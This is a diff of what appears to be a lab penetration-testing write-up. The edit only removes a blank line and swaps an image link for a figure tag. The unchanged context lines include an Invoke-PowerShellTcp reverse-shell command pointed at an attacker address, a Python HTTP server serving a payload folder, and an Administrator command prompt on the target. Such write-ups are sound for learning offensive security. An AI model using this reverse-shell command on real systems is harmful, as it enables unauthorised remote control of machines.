@@ -196,7 +196,6 @@ NULL
 Invoke-PowerShellTcp -Reverse -IPAddress "10.10.16.2" -Port "443"
 ```
 
-
 ```
 ┌──[Sat Nov  5 04:01:42 PM CDT 2022]-[wlan0:192.168.1.153 tun0:10.10.16.2]-[TheScriptKid]-[/home/pentester/Documents/PenetrationTesting]
 └──# python3 -m http.server 80 -d /opt/winreconpack
@@ -359,4 +358,4 @@ Ethernet adapter Ethernet0 2:
 C:\Users\Administrator\Desktop>
 ```
 
-![[Pasted image 20221105185353.png]]
+<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
